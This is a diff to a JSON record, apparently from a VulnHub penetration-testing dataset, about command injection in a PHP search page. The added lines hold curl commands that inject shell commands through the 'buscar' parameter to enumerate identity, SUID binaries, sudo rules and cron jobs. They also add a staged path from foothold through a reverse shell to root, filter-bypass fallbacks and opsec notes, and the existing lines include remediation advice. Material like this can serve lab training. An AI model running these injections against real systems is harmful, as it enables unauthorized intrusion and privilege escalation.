@@ -56,6 +56,67 @@
   "requires_callback": true,
   "callback_note": "需要目标回连攻击机以获取交互式shell。替代方案：使用命令注入直接执行系统命令获取输出，如curl 'http://{TARGET}/site/busque.php?buscar=test;ls%20-la'",
   "remediation": "1. 对用户输入进行严格过滤和验证 2. 使用参数化查询或白名单机制 3. 避免在系统调用中使用用户可控的输入 4. 实施最小权限原则",
+  "privesc_steps": [
+    {
+      "step": 1,
+      "description": "通过命令注入点做基础身份与内核枚举（输出在 HTTP 响应中）",
+      "command": "curl -sG 'http://{TARGET}/site/busque.php' --data-urlencode 'buscar=test;id;uname -a'"
+    },
+    {
+      "step": 2,
+      "description": "枚举常见 SUID（结果在响应中截断展示即可）",
+      "command": "curl -sG 'http://{TARGET}/site/busque.php' --data-urlencode 'buscar=test;find / -perm -4000 -type f 2>/dev/null | head -40'"
+    },
+    {
+      "step": 3,
+      "description": "检查 sudo 规则是否可滥用",
+      "command": "curl -sG 'http://{TARGET}/site/busque.php' --data-urlencode 'buscar=test;sudo -l'"
+    },
+    {
+      "step": 4,
+      "description": "查找当前用户可写目录或计划任务痕迹",
+      "command": "curl -sG 'http://{TARGET}/site/busque.php' --data-urlencode 'buscar=test;ls -la /etc/cron* 2>/dev/null; ls -la /var/spool/cron 2>/dev/null'"
+    }
+  ],
+  "path_templates": [
+    {
+      "stage": "surface_enum",
+      "precondition": "Web 服务可达",
+      "action": "确认 /site/busque.php 存在与参数 buscar 回显",
+      "success_sign": "搜索参数回显到页面",
+      "next_stage": "foothold"
+    },
+    {
+      "stage": "foothold",
+      "precondition": "命令注入字符可用（如分号）",
+      "action": "buscar=test;id 与读 /etc/passwd 验证 RCE",
+      "success_sign": "响应中出现 uid= 或 passwd 内容",
+      "next_stage": "foothold_stable"
+    },
+    {
+      "stage": "foothold_stable",
+      "precondition": "需交互式 shell 或继续无回连 RCE",
+      "action": "反弹 shell 或逐条 curl 注入枚举",
+      "success_sign": "稳定命令执行或会话建立",
+      "next_stage": "privesc"
+    },
+    {
+      "stage": "privesc",
+      "precondition": "以 www-data 等低权限立足",
+      "action": "sudo/SUID/内核/定时任务 逐项验证",
+      "success_sign": "uid=0 或 root 可读",
+      "next_stage": "objective"
+    }
+  ],
+  "fallbacks": [
+    {
+      "stage": "foothold",
+      "action": "若分号被过滤，尝试管道、换行、编码绕过"
+    }
+  ],
+  "opsec_notes": [
+    "主机链优先：先确认注入面再扩大 payload，避免盲打大量系统命令"
+  ],
   "tags": [
     "vulnhub",
     "command_injection",
